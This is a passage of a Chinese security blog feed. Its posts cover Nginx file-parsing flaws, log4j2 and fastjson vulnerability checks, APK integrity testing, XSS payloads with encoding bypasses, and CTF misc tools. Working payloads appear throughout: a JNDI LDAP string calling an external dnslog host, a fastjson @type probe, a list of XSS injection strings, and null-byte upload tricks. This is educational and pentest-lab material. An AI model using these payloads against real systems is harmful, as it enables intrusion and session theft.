href="#1、phpcgi漏洞-2" class="headerlink" title="1、phpcgi漏洞"></a>1、phpcgi漏洞</h2><pre class="line-numbers language-php"><code class="language-php">test<span class="token punctuation">.</span>jpg<span class="token operator">/</span>x<span class="token punctuation">.</span>phpNginx <span class="token operator">&lt;</span> <span class="token number">8.03</span>版本和前面的phpcgi解析漏洞一样的原理，x<span class="token punctuation">.</span>php是不存在的文件，所以会向前递归解析，而test<span class="token punctuation">.</span>jpg会被当做php文件执行。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、Nginx空字节漏洞"><a href="#2、Nginx空字节漏洞" class="headerlink" title="2、Nginx空字节漏洞"></a>2、Nginx空字节漏洞</h2><pre class="line-numbers language-php"><code class="language-php">test<span class="token punctuation">.</span>jpg<span class="token operator">%</span><span class="token number">00</span><span class="token punctuation">.</span>phpNginx <span class="token number">0.5</span><span class="token operator">/</span><span class="token number">0.6</span><span class="token operator">/</span><span class="token number">0.7</span><span class="token operator">&lt;=</span><span class="token number">0.765</span><span class="token operator">/</span><span class="token number">0.8</span><span class="token operator">&lt;=</span><span class="token number">0.837</span>版本会把test<span class="token punctuation">.</span>jpg当做php文件解析<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <categories>
      
      <category>web漏洞原理总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web漏洞</tag>
      
      <tag>文件上传</tag>
      
      <tag>解析漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>log4j2代码执行漏洞</title>
    <link href="/posts/f6c8.html"/>
    <url>/posts/f6c8.html</url>
    
    <content type="html"><![CDATA[<p>验证网站是否存在log4j2漏洞的方法~~</p><span id="more"></span><h1 id="一、描述"><a href="#一、描述" class="headerlink" title="一、描述"></a>一、描述</h1><p>    log4j2是一个基于Java的日志记录框架。在大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。只要日志内容中包含关键词 ${，那么这里面包含的内容就可以作为变量进行替换，攻击者无需任何权限，可以执行任意命令。</p><h1 id="二、验证漏洞是否存在"><a href="#二、验证漏洞是否存在" class="headerlink" title="二、验证漏洞是否存在"></a>二、验证漏洞是否存在</h1><p>    这里我使用的是vulfocus平台上面的一个log4j2的靶场</p><h2 id="方法一：dnslog验证"><a href="#方法一：dnslog验证" class="headerlink" title="方法一：dnslog验证"></a>方法一：dnslog验证</h2><p>1、先通过dnslog获得一个域名</p><p>    构造poc：</p><pre class="line-numbers language-p"><code class="language-p">$&#123;jndi:ldap://o8ll0b.dnslog.cn&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2、用url方式提交payload参数</p><p>    构造payload：换成url形式：</p><pre class="line-numbers language-bash"><code class="language-bash">payload<span class="token operator">=</span>%24%7b%6a%6e%64%69%3a%6c%64%61%70%3a%2f%2f%6f%38%6c%6c%30%62%2e%64%6e%73%6c%6f%67%2e%63%6e%7d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/f6c8/1.png" class><p>3、回到dnslog refresh record刷新列表，可以看到dns的查询记录，证明漏洞存在。</p><p>  <img src="/posts/f6c8/2.png" class></p><h2 id="方法二：使用工具"><a href="#方法二：使用工具" class="headerlink" title="方法二：使用工具"></a>方法二：使用工具</h2><p>    使用工具log4j-scan，使用命令：</p><pre class="line-numbers language-bash"><code class="language-bash">python log4j-scan -u http://123.58.224.8:57302/hello?payload<span class="token operator">=</span>111<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  <img src="/posts/f6c8/3.png" class></p><h2 id="方法三：使用burp插件"><a href="#方法三：使用burp插件" class="headerlink" title="方法三：使用burp插件"></a>方法三：使用burp插件</h2><p>用burp抓包之后，发送到log4j2 RCE插件，如果有漏洞，则会自动产生请求和响应。</p><p> <img src="/posts/f6c8/4.png" class></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>框架漏洞</tag>
      
      <tag>代码执行</tag>
      
      <tag>log4j2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjson反序列化漏洞</title>
    <link href="/posts/4554.html"/>
    <url>/posts/4554.html</url>
    
    <content type="html"><![CDATA[<p>验证网站是否存在fastjson漏洞的方法~~</p><span id="more"></span><h1 id="一、fastjson简介"><a href="#一、fastjson简介" class="headerlink" title="一、fastjson简介"></a>一、fastjson简介</h1><p>        fastjson是java的一个库，可以使java对象和json格式的字符串相互转换。序列化是将java对象转为为json格式的字符串，反序列化就是将json格式的字符串转为java对象。</p><h1 id="二、漏洞简介"><a href="#二、漏洞简介" class="headerlink" title="二、漏洞简介"></a>二、漏洞简介</h1><p>        fastjson在解析json的过程中，会自动调用@type指定类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p><h1 id="三、漏洞详情"><a href="#三、漏洞详情" class="headerlink" title="三、漏洞详情"></a>三、漏洞详情</h1><p>        组件名称：fastjson</p><p>        影响版本：fastjson&lt;=1.2.80</p><p>        漏洞类型：远程任意代码执行</p><h1 id="四、漏洞探测"><a href="#四、漏洞探测" class="headerlink" title="四、漏洞探测"></a>四、漏洞探测</h1><h2 id="1、根据返回包判断"><a href="#1、根据返回包判断" class="headerlink" title="1、根据返回包判断"></a>1、根据返回包判断</h2><p>        任意抓包，将提交方式改为POST。返回包就会出现fastjson字样。</p><p> <img src="/posts/4554/1.png" class></p><h2 id="2、修改请求包"><a href="#2、修改请求包" class="headerlink" title="2、修改请求包"></a>2、修改请求包</h2><p>        用burp抓包，将发送方式改为post，更改类型为json，添加json格式的字符串，可以看到返回包中成功了。</p><pre class="line-numbers language-py"><code class="language-py">POSTContent-Type: application/json&#123;"age":25,"name":"Bl2e"&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/4554/2.png" class></p><h2 id="3、利用dnslog平台"><a href="#3、利用dnslog平台" class="headerlink" title="3、利用dnslog平台"></a>3、利用dnslog平台</h2><p>        修改请求包，将GET方法改为POST，更改类型为json，添加json格式的字符串：</p><pre class="line-numbers language-py"><code class="language-py">POSTContent-Type: application/json&#123;"zeo":&#123;"@type":"java.net.Inet4Address","val":"6xyymf.dnslog.cn"&#125;&#125;  //val替换成自己获取到的dnslog<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/4554/3.png" class></p><p>        发送之后，在dnslog平台上refresh record 可以成功得到值，说明存在漏洞。</p><p> <img src="/posts/4554/4.png" class></p><h2 id="4、利用burp插件"><a href="#4、利用burp插件" class="headerlink" title="4、利用burp插件"></a>4、利用burp插件</h2><p>        burp插件下载：<a href="https://github.com/Maskhe/FastjsonScan/releases">https://github.com/Maskhe/FastjsonScan/releases</a></p><p>        注意：该插件只检测传输ison数据格式的数据包，所以数据包中如果没有ison数据需要自行添加。发送无json数据的数据包会提示not supported 不会开始检测。</p><img src="/posts/4554/5.png" class><p>        抓包修改为以POST方式请求，添加ison格式的数据，右键发送给插件。</p><p> <img src="/posts/4554/6.png" class></p><p>        插件成功识别，开始检测漏洞。如果存在漏洞，会在request请求包中显示payload。如果没有漏洞，会展示原始的请求与响应。</p><p> <img src="/posts/4554/7.png" class></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>框架漏洞</tag>
      
      <tag>反序列化</tag>
      
      <tag>fastjson</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>app应用完整性校验</title>
    <link href="/posts/642b.html"/>
    <url>/posts/642b.html</url>
    
    <content type="html"><![CDATA[<p>对于app应用完整性校验的一些方法~~</p><span id="more"></span><p>    apk应用完整性即移动客户端程序安装后，在每次启动时都会对自身文件进行完整性进行校验。防止攻击者通过反编译的方法在客户端程序中植入自己的木马，客户端程序如果没有⾃校验机制的话，攻击者可能会通过篡改客户端程序窃取手机用户的隐私信息。</p><p>完整性校验步骤，下面使用两种方法：</p><h1 id="方法一：自定义修改"><a href="#方法一：自定义修改" class="headerlink" title="方法一：自定义修改"></a>方法一：自定义修改</h1><p>（一般用方法一就好了，简单方便一点）</p><p>1、修改apk的后缀名为zip；</p><p>2、修改logo图片，直接在该zip里面修改，不要将zip解压（注意图片名字不要变）；</p><p>3、再将原先的zip改回apk后缀名（一定要是原来的zip，不能将第一步的zip解压修改图片后再重新压缩，一定要是在该zip里面直接修改！原因大概就是如果你是解压后再修改图片，再压缩回去的话，那文件就变了）；</p><p>4、在安卓上测试能否打开该apk。（若成功安装，则存在问题；安装失败则说明该app的完整性校验没有问题）</p><h1 id="方法二：Apktools-windows签名工具"><a href="#方法二：Apktools-windows签名工具" class="headerlink" title="方法二：Apktools+windows签名工具"></a>方法二：Apktools+windows签名工具</h1><p>    大致简化来说就是：反编译apk文件——&gt;修改源码或资源文件——&gt;重新打包（如果打包失败，则存在问题）——&gt;创建自己的证书——&gt;对打包的apk进行签名——&gt;签名成功后，放到安卓机上是否可以成功安装。如果成功安装，则存在问题。</p><h3 id="step-1-反编译apk文件"><a href="#step-1-反编译apk文件" class="headerlink" title="step 1 反编译apk文件"></a>step 1 反编译apk文件</h3><p>    这里用工具Apktools反编译apk文件。</p><p>    将apk文件放到apktools目录下，进入apktools输入以下命令：</p><pre class="line-numbers language-bash"><code class="language-bash">apktools d xxx.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="/posts/642b/1.png" class></p><p>    反编译成功，会生成同名的文件夹。</p><h3 id="step-2-修改源码或资源文件"><a href="#step-2-修改源码或资源文件" class="headerlink" title="step 2 修改源码或资源文件"></a>step 2 修改源码或资源文件</h3><p>    这里一般是修改app的logo图片，这样能够明显看出来变化。可以替换掉原先的logo图片，注意图片名字不要变。</p><h3 id="step-3-重新打包"><a href="#step-3-重新打包" class="headerlink" title="step 3 重新打包"></a>step 3 重新打包</h3><p>    使用工具Apktools进行打包，命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash">apktool b xxx -o xxx.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>    如果出现以下这种情况，就是打包失败，说明该app的完整性校验没有问题。就不需要看下面的步骤了。</p><p> <img src="/posts/642b/2.png" class></p><h3 id="step-4-创建自己的证书"><a href="#step-4-创建自己的证书" class="headerlink" title="step 4 创建自己的证书"></a>step 4 创建自己的证书</h3><p>    打包成功之后，先创建一个自己的证书，命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash">keytool -genkeypair -keystore 密钥库名 -alias 密钥别名 -validity 天数 - keyalg RSA<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>    对于下面那些问题自己随便命名就好了：</p><p> <img src="/posts/642b/3.png" class></p><p>    使用以下命令可查看创建的证书：</p><pre class="line-numbers language-bash"><code class="language-bash">keytool -list -v keystore 证书名字<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="/posts/642b/4.png" class></p><h3 id="step-5-对打包的apk进行签名"><a href="#step-5-对打包的apk进行签名" class="headerlink" title="step 5 对打包的apk进行签名"></a>step 5 对打包的apk进行签名</h3><p>    这里使用的windows签名工具是360Signer，打开工具，将我们刚刚创建证书的信息填进去，然后点击一键签名。</p><p> <img src="/posts/642b/5.png" class></p><p>    签名成功之后，在模拟器的安卓机上面安装该程序。如果该apk安装失败，则该app的完整性校验没有问题；如果安装成功，则说明该apk的完整性校验存在问题。</p>]]></content>
    
    
    <categories>
      
      <category>Android渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>app安全测试</tag>
      
      <tag>apktools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss漏洞详解</title>
    <link href="/posts/31a8.html"/>
    <url>/posts/31a8.html</url>
    
    <content type="html"><![CDATA[<p>对于xss漏洞一些基本的总结~~</p><span id="more"></span><h1 id="00x1-xss分类"><a href="#00x1-xss分类" class="headerlink" title="00x1 xss分类"></a>00x1 xss分类</h1><h3 id="1、反射型"><a href="#1、反射型" class="headerlink" title="1、反射型"></a>1、反射型</h3><p>     反射型 XSS，非持久化，需要欺骗用户自己去点击链接才能触发 XSS 代码</p><h3 id="2、存储型"><a href="#2、存储型" class="headerlink" title="2、存储型"></a>2、存储型</h3><p>    存储型 XSS，持久化，代码是存储在服务器中的数据库里，如在个人信息或发表文章等地方，可以插入代码，如果插入的数据没有过滤或过滤不严，那么这些恶意代码没有经过过滤将储存到数据库中，用户访问该页面的时候，没有进行编码过滤输出到浏览器上，就会触发代码执行，造成 xss 攻击。</p><h3 id="3、DOM型"><a href="#3、DOM型" class="headerlink" title="3、DOM型"></a>3、DOM型</h3><p>    DOM，全称 Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。DOM 型 XSS 其实是一种特殊类型的反射型 XSS，它是基于 DOM 文档对象模型的。</p><h1 id="00x2-xss测试语句"><a href="#00x2-xss测试语句" class="headerlink" title="00x2 xss测试语句"></a>00x2 xss测试语句</h1><p>    在测试时，应该输入一些标签如&lt;、&gt;输入后查看网页源代码是否过滤标签，如果没过滤，很大可能存在 xss 漏洞。</p><h3 id="1、常用的测试语句"><a href="#1、常用的测试语句" class="headerlink" title="1、常用的测试语句"></a>1、常用的测试语句</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>h5<span class="token operator">></span>1<span class="token operator">&lt;</span>/h5<span class="token operator">></span><span class="token operator">&lt;</span>span<span class="token operator">></span>1<span class="token operator">&lt;</span>/span<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>console.log<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、-闭合"><a href="#2、-闭合" class="headerlink" title="2、 闭合"></a>2、 闭合</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token string">">&lt;span>x&lt;/span>&lt;"</span><span class="token string">'>">&lt;span>x&lt;/span>&lt;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="3、单行注释"><a href="#3、单行注释" class="headerlink" title="3、单行注释"></a>3、单行注释</h3><pre class="line-numbers language-bash"><code class="language-bash">"<span class="token operator">></span><span class="token operator">&lt;</span>span<span class="token operator">></span>x<span class="token operator">&lt;</span>/span<span class="token operator">></span>//<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="00x3-常见payload"><a href="#00x3-常见payload" class="headerlink" title="00x3 常见payload"></a>00x3 常见payload</h1><pre class="line-numbers language-bash"><code class="language-bash">1、<span class="token operator">&lt;</span>script<span class="token operator">></span>标签    <span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span>2、触发事件    onfoucs<span class="token operator">=</span>javascript:alert<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span>3、<span class="token operator">&lt;</span>a<span class="token operator">></span>标签    <span class="token operator">&lt;</span>a href<span class="token operator">=</span>javascript:alert<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">></span>xss<span class="token operator">&lt;</span>/a<span class="token operator">></span>4、<span class="token operator">&lt;</span>img<span class="token operator">></span>标签    <span class="token operator">&lt;</span>img src<span class="token operator">=</span>111 onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">></span>    （在js中如果src属性的值不正常或无法访问时就可触发onerror事件）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="00x4-xss编码绕过"><a href="#00x4-xss编码绕过" class="headerlink" title="00x4 xss编码绕过"></a>00x4 xss编码绕过</h1><h3 id="1、gpc过滤字符"><a href="#1、gpc过滤字符" class="headerlink" title="1、gpc过滤字符"></a>1、gpc过滤字符</h3><p>    如果 gpc 开启的时候，特殊字符会被加上斜杠即，’变成&#39; 所以xss 攻击代码不要带用单引号或双引号。</p><h3 id="2、过滤alert"><a href="#2、过滤alert" class="headerlink" title="2、过滤alert"></a>2、过滤alert</h3><p>    当页面过滤掉alert时，使用不出现alert的语句即可，例：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>prompt<span class="token punctuation">(</span>/xss/<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>confirm<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="3、过滤标签"><a href="#3、过滤标签" class="headerlink" title="3、过滤标签"></a>3、过滤标签</h3><p>    ● 在程序里如果使用 html 实体过滤，如在 php 会使用 htmlspecialchars()对输入的字符进行实体化，实体化之后的字符不会在 html 执行。</p><p>    ● 就不使用一些实体，如&lt; &gt; ‘ “ &amp;等，如：</p><pre class="line-numbers language-bash"><code class="language-bash">onclick<span class="token operator">=</span>"javascript:alert<span class="token punctuation">(</span>/xss/<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4、ascii编码"><a href="#4、ascii编码" class="headerlink" title="4、ascii编码"></a>4、ascii编码</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span>String.fromCharCode<span class="token punctuation">(</span>88,83,83<span class="token punctuation">))</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5、url编码"><a href="#5、url编码" class="headerlink" title="5、url编码"></a>5、url编码</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"javascript:%61%6c%65%72%74%28%32%29"</span><span class="token operator">></span>123<span class="token operator">&lt;</span>/a<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="6、js编码"><a href="#6、js编码" class="headerlink" title="6、js编码"></a>6、js编码</h3><p>    ● 八进制编码</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>eval<span class="token punctuation">(</span><span class="token string">"\141\154\145\162\164\50\61\51"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>    ● 十六进制编码</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>eval<span class="token punctuation">(</span><span class="token string">"\x61\x6c\x65\x72\x74\x28\x31\x29"</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>    ● jsunicode 编码</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>\u0061\u006c\u0065\u0072\u0074<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="7、html编码"><a href="#7、html编码" class="headerlink" title="7、html编码"></a>7、html编码</h3><p>    ● 在=后可以解析html编码</p><p>    ● 十进制</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>img src<span class="token operator">=</span>111 onerror<span class="token operator">=</span><span class="token string">"alert(1)"</span> /<span class="token operator">></span><span class="token operator">&lt;</span>button onclick<span class="token operator">=</span><span class="token string">"confirm('7');"</span><span class="token operator">></span>Button<span class="token operator">&lt;</span>/button<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>    ● 十六进制</p><p><code>&lt;img src=&quot;x&quot; onerror=&quot;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot; /&gt;</code></p><h3 id="8、base64编码"><a href="#8、base64编码" class="headerlink" title="8、base64编码"></a>8、base64编码</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="</span><span class="token operator">></span>111<span class="token operator">&lt;</span>/a<span class="token operator">></span><span class="token operator">&lt;</span>object data<span class="token operator">=</span><span class="token string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="</span><span class="token operator">></span><span class="token operator">&lt;</span>/object<span class="token operator">></span><span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="</span><span class="token operator">></span><span class="token operator">&lt;</span>/iframe<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="00x5-xss防御"><a href="#00x5-xss防御" class="headerlink" title="00x5 xss防御"></a>00x5 xss防御</h1><p>1、在cookie中添加httponly属性</p><p>2、输入检查（对客户端和服务端都要做输入的字符中是否有特殊字符的过滤检查）</p><p>3、输出检查（使用编码或者转义的方式）</p>]]></content>
    
    
    <categories>
      
      <category>web漏洞原理总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web漏洞</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于ctf的misc相关工具汇总</title>
    <link href="/posts/387a.html"/>
    <url>/posts/387a.html</url>
    
    <content type="html"><![CDATA[<p>一些些好用的misc工具分享<span id="more"></span></p><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>    做了一些些关于misc的题目，个人总结了一些挺好用的工具。这些工具都可以去github搜索并下载。</p><!--more--><h1 id="00x1-winhex"><a href="#00x1-winhex" class="headerlink" title="00x1 winhex"></a>00x1 winhex</h1><p>    这个工具简直就是必备。关于图片的题目我一般都会用这个工具打开查看它的文本里面是否隐藏了flag。不用这个，也可以用其他的十六进制查看工具。总之，就是必须备用。</p><h1 id="ox02-foremost"><a href="#ox02-foremost" class="headerlink" title="ox02 foremost"></a>ox02 foremost</h1><p>    这个工具是文件分离经常需要用到的。虽然我经常看到一些大佬都是在linux里面用一些自带的工具进行文件分离，但我着实懒得打开虚拟机。而且这个工具也蛮好用的。一般是可以分离出图片中隐写的压缩包。</p><p>    它可以添加到电脑的“发送到”这个快捷方式里面，使用起来超级便捷。</p><p>    具体添加方法如下：</p><h2 id="step-1-新建bat文件"><a href="#step-1-新建bat文件" class="headerlink" title="step 1 新建bat文件"></a>step 1 新建bat文件</h2><p>    先新建一个txt文件，输入以下内容：</p><pre class="line-numbers language-bash"><code class="language-bash">@echo off<span class="token function">cd</span> D:\tools\ctf\foremost --<span class="token operator">></span>这行换成你的安装目录，即foremost.exe所在目录<span class="token keyword">set</span> path<span class="token operator">=</span>%~dp1start foremost -i %1 -o %path%\outfile<span class="token keyword">echo</span>  foremost解密成功pause<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>    保存，然后将txt文件的后缀改为bat</p><h2 id="step-2-粘贴快捷方式"><a href="#step-2-粘贴快捷方式" class="headerlink" title="step 2 粘贴快捷方式"></a>step 2 粘贴快捷方式</h2><p>    复制step 1创建的这个bat文件，打开sendto文件夹（一般在电脑的C:\Users\你的用户名\AppData\Roaming\Microsoft\Windows\SendTo位置），右键，选择“粘贴快捷方式”。</p><p>    可以改成自己想要的名字，然后就可以看到这个快捷方式出现在鼠标右键中的“发送到”这个选项里面啦，以后只需要点击相应文件，右键即可：</p><p> <img src="/posts/387a/1.png" class></p><h1 id="0x03-stegsolve"><a href="#0x03-stegsolve" class="headerlink" title="0x03 stegsolve"></a>0x03 stegsolve</h1><p>    另一个文件分离的神器。前面介绍的foremost，我感受到的它只能分离出图片中隐写了压缩包的。但是文件隐写还有可能在一张图片里面包含另一种图片，包含文本，其他等等，而这些可以靠stegsolve分离出来。</p><p>    一般就是在最下面的左右滑动键中，查看图片。常用的功能是analyse中data extract，也就是数据提取的意思。</p><p> <img src="/posts/387a/2.png" class></p><p>    比如一张图片里面可能隐写了其他内容，在打开图片的时候，选择data extract，然后勾选red，green，blue中的000，也就是表示2的0次方，然后选择preview预览文件的数据。可以通过判断文件类型，来选择保存的时候后缀名。</p><p>    比如下面下面这个就是png类型，点击save bin，然后文件名为任意后缀为png的名字即可。</p><p> <img src="/posts/387a/3.png" class></p><h1 id="0x04-ARCHPR"><a href="#0x04-ARCHPR" class="headerlink" title="0x04 ARCHPR"></a>0x04 ARCHPR</h1><p>    这个工具就是暴力破解压缩包的密码。当题目给了一个加密的压缩包（真加密的那种），然后有给出密码的提示，比如四位数字等。这时候就可以利用这个工具直接暴力破解出密码。</p><h1 id="0x05-ZipCenOp"><a href="#0x05-ZipCenOp" class="headerlink" title="0x05 ZipCenOp"></a>0x05 ZipCenOp</h1><p>    这个工具就是检测zip伪加密然后解除伪加密的。一般题目中给了一个加密的压缩包，然后又没有给任何密码提示，那么很有可能是进行了伪加密。</p><p>    关于判断zip文件伪加密的方法，可直接看一下我的这篇文章：<a href="https://echozt.github.io/posts/88f1.html">判断zip文件伪加密 - echozt</a></p><p>    一般题目没给密码提示时，我会直接将加密的压缩先用zipcenop检测一下，如果是则自动解除加密了，如果不是就的确是真加密了。</p>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>ctf</tag>
      
      <tag>winhex</tag>
      
      <tag>foremost</tag>
      
      <tag>stegsolve</tag>
      
      <tag>ARCHPR</tag>
      
      <tag>ZipCenOp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>判断zip文件伪加密</title>
    <link href="/posts/88f1.html"/>
    <url>/posts/88f1.html</url>
    
    <content type="html"><![CDATA[<p>关于判断zip文件是否进行了伪加密的方法，以及如何解除伪加密。</p><span id="more"></span><h1 id="step-1-winhex查看zip压缩包"><a href="#step-1-winhex查看zip压缩包" class="headerlink" title="step 1 winhex查看zip压缩包"></a>step 1 winhex查看zip压缩包</h1><p>    将可能进行了伪加密的压缩包用winhex打开，首先了解一下基本的zip包的构造：</p><p>（1）压缩源文件数据区标识：即当头文件是504B0304时，则表示文件类型为zip压缩包。</p><p>（2）第一个全局方式位标记：即下图中在数据区标识后两位的0900，这个是判断文件有无加密。</p><p>（3）压缩源文件目录区标识：即下图中出现的504B0102。</p><p>（4）第二个全局方式位标记：即下图中在目录区标识后四位的0900，这个是判断文件是否进行了伪加密。压缩源文件目录结束标识：即为504B0506时，标识目录区结束。</p><img src="/posts/88f1/1.png" class><h1 id="step-2-判断是否为伪加密"><a href="#step-2-判断是否为伪加密" class="headerlink" title="step 2 判断是否为伪加密"></a>step 2 判断是否为伪加密</h1><ul><li>无加密</li></ul><p>        o 压缩源文件数据区的全局加密应当为00 00</p><p>        o 且压缩源文件目录区的全局方式位标记应当为00 00</p><ul><li>伪加密</li></ul><p>        o 压缩源文件数据区的全局加密应当为00 00</p><p>        o 且压缩源文件目录区的全局方式位标记应当为09 00</p><ul><li>真加密</li></ul><p>        o 压缩源文件数据区的全局加密应当为09 00</p><p>        o 压缩源文件目录区的全局方式位标记应当为09 00</p><h1 id="step-3-修改数据"><a href="#step-3-修改数据" class="headerlink" title="step 3 修改数据"></a>step 3 修改数据</h1><p>    如果判断出文件为伪加密，按照step 2的描述，只需要将压缩源文件目录区的全局方式位标记由09 00改成00 00，并保存修改即可。这样伪加密的文件就会自动解密。</p><p>    也可以使用工具，将进行了伪加密的文件使用工具zipcenop可直接解除加密。</p><p>    我一般不怎么看十六进制数据，因为之前遇到过一个题目，它的两个标识位都为09 09，按理来说应该是真加密，但好巧不巧，它就是伪加密。所以题目没给密码提示时，我会直接将加密的压缩先用zipcenop检测一下，如果是则自动解除加密了，如果不是就的确是真加密了。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>ctf</tag>
      
      <tag>伪加密</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buuctf之misc部分题解</title>
    <link href="/posts/c662.html"/>
    <url>/posts/c662.html</url>
    
